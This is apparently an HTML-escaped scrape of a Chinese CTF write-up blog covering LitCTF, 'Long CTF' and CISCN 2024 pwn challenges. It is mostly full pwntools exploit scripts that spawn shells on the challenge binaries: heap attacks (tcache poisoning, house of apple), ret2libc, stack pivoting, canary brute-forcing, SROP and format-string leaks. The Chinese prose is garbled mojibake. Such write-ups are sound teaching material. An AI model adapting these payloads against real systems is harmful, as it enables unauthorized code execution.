	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	
def edit(idx,string):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(&amp;quot;content : \n&amp;quot;)
	p.send(string)
	
def show(idx):
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx? &amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;&amp;gt;&amp;gt;&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(0,1060)
add(2,0x68)
add(3,0x68)
add(1,16)
dele(0)
show(0)
main = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
base = main - 2206944
env = base + 2236928
# env = libc_base + libc.sym[&#39;environ&#39;]
print(&amp;quot;base = &amp;quot;,hex(base))
dele(2)
dele(3)
show(2)
p.recvuntil(b&#39;content : &#39;)
key = u64(p.recv(5).ljust(8,b&#39;\x00&#39;))#288
edit(3,p64(key ^ env))
print(&amp;quot;heap = &amp;quot;,hex(key))
print(&amp;quot;env = &amp;quot;,hex(env))
add(4,0x68)
add(5,0x68)
show(5)
stack = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 288 - 8
print(&amp;quot;stack = &amp;quot;,hex(stack))
add(6,0x78)
add(7,0x78)
dele(6)
dele(7)
edit(7,p64(key ^ stack))

add(8,0x78)
add(9,0x78)
rdi = base + 0x000000000002a3e5
ret = base + 0x0000000000029139
sys = base + 0x0000000000050D70
sh = base + 0x00000000001D8678

pay = b&#39;a&#39;*24

edit(9,pay)
print(&amp;quot;stack = &amp;quot;,hex(stack))
show(9)
bss = u64(p.recvuntil(b&#39;\x55&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 0x17a1
print(&amp;quot;bss = &amp;quot;,hex(bss))
ptr = bss + 0x4060
print(&amp;quot;ptr = &amp;quot;,hex(ptr))
add(10,0x58)
add(11,0x58)
dele(10)
dele(11)
edit(11,p64(key ^ (ptr + 64)))
add(12,0x58)
add(13,0x58)

edit(13,p64(0) + p64(stack - 32))
pay = b&#39;a&#39;*8 + p64(ret) + p64(rdi) + p64(sh) + p64(sys)
print(&amp;quot;ptr = &amp;quot;,hex(ptr))
#gdb.attach(p)
edit(9,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ¥ä¸‹æ¥æ˜¯æ‰“çš„IOï¼Œéå¸¸ç»å…¸ï¼Œæ¿å­ä¸­çš„æ¿å­&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./heap&#39;)
e = ELF(&#39;./heap&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22æ‰“æœ¬åœ°

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&#39;)
    r.sendline(str(choice).encode())


def add(idx, size):
    cmd(1)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size? &#39;)
    r.sendline(str(size).encode())


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(4)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)
    r.send(content)


def exit():
    cmd(5)

gdb.attach(r,&amp;quot;b *$rebase(0x0000000000017D2)&amp;quot;)
add(8, 0x18)
add(0, 0x510)
add(1, 0x30)  # 0x20çš„è¯chunk2çš„åœ°å€æ˜¯00ç»“å°¾ï¼Œprintfæ²¡æ³•æ³„éœ²ï¼Œæ‰€ä»¥è¦0x30
add(2, 0x520)
add(3, 0x30)
delete(2)
# dbg()
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b&#39;\0&#39;))  # å…¶å®æ˜¯main_arena+0x490
libcbase = large - 0x670 - libc.sym[&#39;_IO_2_1_stdin_&#39;]
_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]
system = libcbase + libc.sym[&#39;system&#39;]

success(&#39;libcbase: &#39; + hex(libcbase))

edit(2, b&#39;A&#39; * 0x10)
# pause()
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b&#39;\0&#39;))
success(&#39;heap: &#39; + hex(heap))

delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))

add(5, 0x550)
chunk_addr = heap - 0x560  # chunk0çš„chunkåœ°å€ fpåœ°å€
#-------------------------house of apple-------------------------
# edit(8, b&#39;A&#39; * 0x10 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;)
# fake_io_file = p64(0)*2 + p64(1) + p64(2)
# fake_io_file = fake_io_file.ljust(
#     0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data
# fake_io_file = fake_io_file.ljust(
#     0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
# fake_io_file = fake_io_file.ljust(
#     0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
# fake_io_file = fake_io_file.ljust(
#     0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)
# fake_io_file = fake_io_file.ljust(
#     0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)
# edit(0, fake_io_file)
#----------------------------------------------------------------

#-------------------------_IO_obstack_jumps-------------------------
edit(8, b&#39;A&#39; * 0x10 + b&#39;/bin/sh\x00&#39;)
def get_IO_str_jumps():
    IO_file_jumps_addr = libc.sym[&#39;_IO_file_jumps&#39;]
    IO_str_underflow_addr = libc.sym[&#39;_IO_str_underflow&#39;]
    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
        possible_IO_str_jumps_addr = ref - 0x20
        if possible_IO_str_jumps_addr &amp;gt; IO_file_jumps_addr:
            return possible_IO_str_jumps_addr
payload = flat(
    {
        0x8:1,
        0x10:0,
        0x38:chunk_addr,
        0x28:system,
        0x18:1,
        0x20:0,
        0x40:1, 
        0xd0:chunk_addr,
        0xc8:libcbase + get_IO_str_jumps() - 0x300 + 0x20
    },
    filler = &#39;\x00&#39;
)
edit(0, payload)
#-----------------------------------------------------------------
# dbg()
exit()# è§¦å‘abort()

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;heap-239&#34;&gt;heap-2.39&lt;/h1&gt;
&lt;p&gt;é™åˆ¶äº†ä¸€ä¸‹å †å—çš„å¤§å°ï¼Œä¹Ÿæ˜¯house of appleç§’äº†ï¼Œå°±æ˜¯æˆ‘kaliç‰ˆæœ¬æœ‰ç‚¹ä½ä¸æ”¯æŒ2.39ï¼Œåˆæ•´äº†ä¸ª22.04çš„ä¹Œç­å›¾ï¼Œ&lt;s&gt;å¥½çœ‹çš„é›…ç—&lt;/s&gt;ğŸ˜Š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
r = process(&#39;./heap&#39;)
e = ELF(&#39;./heap&#39;)
libc = ELF(&#39;./libc.so.6&#39;)  # ubuntu22æ‰“æœ¬åœ°

one = [0xe6aee, 0xe6af1, 0xe6af4]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b&#39;&amp;gt;&amp;gt;&#39;)
    r.sendline(str(choice).encode())


def add(idx, size):
    cmd(1)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;size? &#39;)
    r.sendline(str(size).encode())


def delete(idx):
    cmd(2)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())


def show(idx):
    cmd(3)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)


def edit(idx, content=b&#39;deafbeef&#39;):
    cmd(4)
    r.recvuntil(b&#39;idx? &#39;)
    r.sendline(str(idx).encode())
    r.recvuntil(b&#39;content : &#39;)
    r.send(content)


def exit():
    cmd(5)

add(8, 0x418)
add(0, 0x510)
add(1, 0x430)
add(2, 0x520)
add(3, 0x430)
delete(2)
add(4, 0x530)
show(2)
large = u64(r.recv(6).ljust(8, b&#39;\0&#39;))  # å…¶å®æ˜¯main_arena+0x490
libcbase = large - 0x670 - libc.sym[&#39;_IO_2_1_stdin_&#39;]
_IO_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;]
io_wfile_jumps = libcbase + libc.sym[&#39;_IO_wfile_jumps&#39;]
system = libcbase + libc.sym[&#39;system&#39;]

success(&#39;libcbase: &#39; + hex(libcbase))

edit(2, b&#39;A&#39; * 0x10)
# pause()
show(2)
r.recv(0x10)
heap = u64(r.recv(6).ljust(8, b&#39;\0&#39;))
success(&#39;heap: &#39; + hex(heap))

delete(0)

edit(2, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - 0x20))
dbg()

add(5, 0x550)
chunk_addr = heap - 0x560 - 1024 # chunk0çš„chunkåœ°å€ fpåœ°å€
print(&#39;chunk_addr:&#39;,hex(chunk_addr))
#-------------------------house of apple-------------------------
edit(8, b&#39;A&#39; * 0x410 + p32(0xfffff7f5) + b&#39;;sh\x00&#39;)
fake_io_file = p64(0)*2 + p64(1) + p64(2)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b&#39;\0&#39;) + p64(0)*13 + p64(system)
edit(0, fake_io_file)
#----------------------------------------------------------------

#-------------------------_IO_obstack_jumps-------------------------
#edit(8, b&#39;A&#39; * 0x410 + b&#39;/bin/sh\x00&#39;)
#def get_IO_str_jumps():
#    IO_file_jumps_addr = libc.sym[&#39;_IO_file_jumps&#39;]
#    IO_str_underflow_addr = libc.sym[&#39;_IO_str_underflow&#39;]
#    for ref in libc.search(p64(IO_str_underflow_addr-libc.address)):
#        possible_IO_str_jumps_addr = ref - 0x20
#        if possible_IO_str_jumps_addr &amp;gt; IO_file_jumps_addr:
#            return possible_IO_str_jumps_addr
#payload = flat(
#    {
#        0x8:1,
#        0x10:0,
#        0x38:chunk_addr,
#        0x28:system,
#        0x18:1,
#        0x20:0,
#        0x40:1, 
#        0xd0:chunk_addr,
#        0xc8:libcbase + get_IO_str_jumps() - 0x300 + 0x20
#    },
#    filler = &#39;\x00&#39;
#)
#edit(0, payload)
#-----------------------------------------------------------------
# dbg()
exit()# è§¦å‘abort()

r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;atm&#34;&gt;ATM&lt;/h1&gt;
&lt;p&gt;ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./app&amp;quot;)
p = remote(&#39;node1.anna.nssctf.cn&#39;,28849)
	
#
leave = 0x000000000040147c
rdi = 0x0000000000401233
bss = 0x000000000404040 + 0x800
ret = 0x000000000040101a
p.sendafter(b&amp;quot;password:\n&amp;quot;,b&#39;1&#39;)
p.sendafter(b&#39;Exit\n&#39;,b&#39;3&#39;)
p.sendafter(b&#39;deposit:&#39;,b&#39;1000&#39;)
p.sendlineafter(b&#39;Exit\n&#39;,b&#39;5&#39;)
p.recvuntil(b&#39;0x&#39;)
printf = int(p.recv(12),16)
base = printf - 0x000000000060770
print(&amp;quot;base = &amp;quot;,hex(base))
sys = base + 0x000000000050D60
sh = base + 0x0000000001D8698
pay = b&#39;a&#39;*360 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)
p.send(pay)
#gdb.attach(p)
p.sendafter(b&#39;Exit\n&#39;,b&#39;4&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">litctf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/long-ctf/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1716968933067.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç—›å¤±å£¹ä½°å…ƒå­ğŸ˜­ï¼Œç¬¬ä¸€æ¬¡akï¼Œå‡ºçš„æ¯”è¾ƒç®€å•&lt;/p&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;h2 id=&#34;stack&#34;&gt;stack&lt;/h2&gt;
&lt;p&gt;æŸ¥çœ‹ç¨‹åºåªæœ‰ä¸€ä¸ªreadä¸”æº¢å‡ºäº†0x10ä¸ªå­—èŠ‚ï¼Œæ‰“æ ˆè¿ç§»ï¼Œè¿ç§»ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ³„éœ²libcåœ°å€ä¸€æ¬¡å¾—åˆ°shellï¼Œç”±äºéœ€è¦å†æ¬¡readæ‰€ä»¥ç›´æ¥åˆ©ç”¨mainå‡½æ•°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./pwn&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31454)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

rdi = 0x0000000000401210
rsi_r15 = 0x0000000000401281
rbp = 0x000000000040115d
bss = 0x0000000000404000 + 0x500
puts = 0x401060
got = 0x000000000404028
leave = 0x00000000004011be

#gdb.attach(p)

payload = b&#39;a&#39;*0x100 + p64(bss + 0x100) + p64(0x00000000040119B)
p.sendafter(&amp;quot;pivoting?\n&amp;quot;,payload)

pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x00000000040119B)
pay = pay.ljust(0x100,b&#39;\x00&#39;) + p64(bss - 8) + p64(leave)
p.send(pay)
read_addr = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))
#base = read_addr - 0x10E1E0#0x00000000010DFC0
libc_base = read_addr - 0x00000000010DFC0
print(hex(libc_base))

#onegadget = [0xe3afe,0xe3b01,0xe3b04]
#one_gadget = libc_base + onegadget[0]

system = libc_base + 0x52290
bin_sh = libc_base + 0x1B45BD
pay3 =(b&#39;a&#39;*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1)+p64(system)).ljust(0x100,b&#39;\x00&#39;)
pay3 += p64(bss+0x300) + p64(leave)
p.send(pay3)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;canary&#34;&gt;canary&lt;/h2&gt;
&lt;p&gt;ä¸€ç›´forkï¼Œæœ‰ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œç”±äºforkå‡ºçš„canaryä¸å˜ï¼Œæ‰€ä»¥å¯ä»¥çˆ†ç ´canaryï¼Œé™æ€ç¼–è¯‘çš„ç¨‹åºï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆropchainå–å¾—shell&lt;br&gt;
ç›¸å…³æŒ‡ä»¤ï¼š&lt;br&gt;
&lt;code&gt;ROPgadget --binary pwn --ropchain&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
local = 0
elf = ELF(&#39;./pwn&#39;)

if local:
    io = process(&#39;./pwn&#39;)
    libc = elf.libc

else:
    io = remote(&#39;challenge.qsnctf.com&#39;,31636)
  

io.recvuntil(&#39;input:\n&#39;)
canary = b&#39;\x00&#39;
for k in range(7):          #è¦çˆ†ç ´çš„å­—èŠ‚æ•°
    for i in range(256):
        payload = b&#39;a&#39;*0x108 + canary + bytes([i])  
        io.send(payload)
        data = io.recvuntil(&amp;quot;input:\n&amp;quot;)  #dataæ¥æ”¶çš„æ˜¯welcome\nå‰çš„å…¨éƒ¨å†…å®¹
        print(data)
        if b&#39;stack&#39; not in data:
            canary += bytes([i])  
            print(&amp;quot;canary is:&amp;quot; + str(canary))#ç¡®ä¿canaryä¸ºå­—ç¬¦ä¸²
            break
print(&amp;quot;canary is:&amp;quot;,hex(u64(canary)))
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b&#39;&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004493d7) # pop rax ; ret
p += b&#39;/bin/sh\x00&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004437a0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004018c2) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040f23e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004017cf) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c10e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004493d7) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004012d3) # syscall
pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
#gdb.attach(io)        
payload0 = b&#39;a&#39;*0x108 + canary + p64(0) + pay
print(len(payload0))

io.send(payload0)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;srop_seccomp&#34;&gt;srop_seccomp&lt;/h2&gt;
&lt;p&gt;å¼€äº†æ²™ç›’ï¼Œå…è®¸orwï¼Œæœ‰mov_rax_0xfå’Œsyscallçš„gadgetsï¼Œæ‰€ä»¥æ‰“sropå¹¶ä¸”é¢˜ç›®ä¹Ÿæœ‰æç¤ºï¼Œç¬¬ä¸€æ¬¡readè¯»å–äº†å¾ˆå¤šï¼Œæ ˆè¿ç§»åˆ°ç¬¬ä¸€æ¬¡è¾“å…¥çš„bssæ®µæ‰“sropã€‚æ³¨æ„ä¸€ä¸‹åç§»å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./chall&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31938)
elf = ELF(&amp;quot;./chall&amp;quot;)
mov_rax_0xf = 0x0000000000401194
bss = 0x404020 + 0x800
syscall = 0x40118a
flag = 0x404060
leave = 0x000000000040136c

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = flag
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = 0x404170
sigframe.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rax = constants.SYS_read
sigframe1.rdi = 3
sigframe1.rsi = bss - 0x100
sigframe1.rdx = 50
sigframe1.rsp = 0x404278
sigframe1.rip = syscall

sigframe2 = SigreturnFrame()
sigframe2.rax = constants.SYS_write
sigframe2.rdi = 1
sigframe2.rsi = bss - 0x100
sigframe2.rdx = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

payload = b&amp;quot;./flag\x00\x00&amp;quot; + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe1) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe2)
p.send(payload)

pay = b&#39;a&#39;*42 + p64(flag + 0x8) + p64(leave)
p.sendafter(&#39;SUID?&#39;,pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ez_quiz&#34;&gt;ez_quiz&lt;/h2&gt;
&lt;p&gt;cè¯­è¨€ä¼ªéšæœº+ä¸€ç‚¹ç‚¹reï¼Œé€†å‘éƒ½å¾—åˆ°token:&lt;code&gt;DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}&lt;/code&gt;&lt;br&gt;
ç»•è¿‡ä¼ªéšæœºåè¿›å…¥giftå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canaryå’Œç¨‹åºåŸºåœ°å€ï¼Œç¬¬äºŒæ¬¡æ ˆæº¢å‡ºåˆ°åé—¨å‡½æ•°&lt;br&gt;
åˆ©ç”¨ctypesåº“åœ¨pythonä»£ç ä¸­è°ƒç”¨Cè¯­è¨€å‡½æ•°ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;1.åˆ›å»ºä¸€ä¸ªCè¯­è¨€æºä»£ç æ–‡ä»¶ï¼Œå‡è®¾åä¸º1.c&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;time.h&amp;gt;
void set_seed() 
{
	time_t seed = time(0);
	srand(seed);
}
int random_number() 
{ Â  Â 
	return rand();
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.å°†å…¶ç¼–è¯‘ä¸ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -shared -o 1.so 1.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import *
import ctypes
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./attachment&amp;quot;)
p = remote(&amp;quot;challenge.qsnctf.com&amp;quot;,31788)
#elf = ELF(&amp;quot;./pwn&amp;quot;)

# åŠ è½½åŠ¨æ€é“¾æ¥åº“
lib = ctypes.CDLL(&#39;./1.so&#39;)
lib.random_number.restype = ctypes.c_int
# è°ƒç”¨Cè¯­è¨€çš„set_seedå‡½æ•°
lib.set_seed()
# è°ƒç”¨Cè¯­è¨€çš„random_numberå‡½æ•°
result = lib.random_number()
rand = result % 256
print(rand)

def lfsr_h(a1):
    v2 = a1 &amp;gt;&amp;gt; 1
    if (a1 &amp;amp; 1) == 1:
        v2 ^= 0xB8
    return v2

# åˆå§‹åŒ–
v8 = rand  # åˆå§‹å€¼ï¼Œå¯ä»¥æ ¹æ®éœ€è¦æ›´æ”¹
v12 = v11 = v10 = v9 = 0

# ä¸»å¾ªç¯ï¼Œè¿›è¡Œ160æ¬¡è¿­ä»£
for i in range(160):
    v8 = lfsr_h(v8)
    
    # åœ¨ç‰¹å®šçš„è¿­ä»£æ¬¡æ•°ä¸Šä¿å­˜å€¼
    if i == 156:
        v12 = v8
    if i == 157:
        v11 = v8
    if i == 158:
        v10 = v8
    if i == 159:
        v9 = v8
# è¾“å‡ºç»“æœ
p.sendlineafter(b&#39;token: &#39;,b&amp;quot;DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}&amp;quot;)

print(f&amp;quot;v12: {v12}&amp;quot;)
print(f&amp;quot;v11: {v11}&amp;quot;)
print(f&amp;quot;v10: {v10}&amp;quot;)
print(f&amp;quot;v9: {v9}&amp;quot;)
x = (( v9 - v10 ) * v11 ) % v12
p.sendlineafter(b&#39;?&#39;,str(x))

p.sendlineafter(&#39;gift:\n&#39;,b&amp;quot;%11$p-%13$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
canary = int(p.recv(16)  ,16)
print(&amp;quot;canary = &amp;quot;,hex(canary))
p.recvuntil(&amp;quot;-&amp;quot;)
backdoor = int(p.recv(16)  ,16) - 1131 - 0x1BD7 + 0x1426
print(&amp;quot;backdoor = &amp;quot;,hex(backdoor))
#gdb.attach(p)
payload = b&#39;a&#39;*40 + p64(canary) + p64(0) + p64(backdoor)
p.send(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">é¾™CTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ciscn2024/"" data-c="
          &lt;h1 id=&#34;gostack&#34;&gt;gostack&lt;/h1&gt;
&lt;p&gt;goè¯­è¨€ç¼–å†™çš„æ ˆæº¢å‡ºï¼Œè²Œä¼¼fun2å°±æ˜¯åé—¨å‡½æ•°ï¼Œä½†æ˜¯ç¡®å®é€†ä¸æ‡‚ï¼Œå¯ä»¥&lt;code&gt;cyclic 0x200&lt;/code&gt;åˆ©ç”¨goè¯­è¨€ç¨‹åºæ ˆæº¢å‡ºåä¼šæ‰“å°å‡ºæ ˆçš„ç›¸å…³ä¿¡æ¯ï¼Œæ‰€ä»¥å¾—åˆ°&lt;img src=&#34;https://l1u66.github.io//post-images/1722410742360.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;em&gt;runtime: unexpected return pc for main.main.func3 called from 0x6361616161616169&lt;/em&gt;&lt;br&gt;
ç„¶å&lt;code&gt;cyclic -l 0x6361616161616169&lt;/code&gt;å³å¯å¾—åˆ°å¡«å……å­—èŠ‚ä¸ªæ•°&lt;img src=&#34;https://l1u66.github.io//post-images/1722410836304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *

p = process(&amp;quot;./gostack&amp;quot;)

context.log_level = &#39;debug&#39;

# ROPgadget
rdi = 0x4a18a5 #0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
rsi = 0x42138a #0x000000000042138a : pop rsi ; ret
rax = 0x40f984 #0x000000000040f984 : pop rax ; ret
rdx = 0x4944ec #0x00000000004944ec : pop rdx ; ret
ret = 0x40201a #0x000000000040201a : ret
syscall = 0x4616C9 #0x00000000004616C9 : syscall ; ret

addr = 0x5978d8 # éšä¾¿æ‰¾ä¸€ä¸ªèƒ½å†™çš„åœ°å€ï¼Œä¸è¡Œå°±æ¢ä¸€ä¸ª

# function
main = 0x04A0AC0

# send
#gdb.attach(p))

# åœ¨addrå¤„å†™å­—ç¬¦ä¸²
payload = b&#39;\x00&#39;*464 + p64(rax) + p64(0x0) + p64(rdi) + p64(0) + p64(0)*5 + p64(rsi) + p64(addr) + p64(rdx) + p64(0x30) + p64(syscall)
# å°†addrå¤„çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°æ‰§è¡Œsys-execv
payload+= p64(rax) + p64(0x3b) + p64(rdi) + p64(addr) + p64(0)*5 + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)

p.sendlineafter(b&#39;Input your magic message :&#39;,payload)

p.recvuntil(b&#39;Your magic message :&#39;)
p.sendline(b&#39;/bin/sh\x00&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;orange_cat_diary&#34;&gt;orange_cat_diary&lt;/h1&gt;
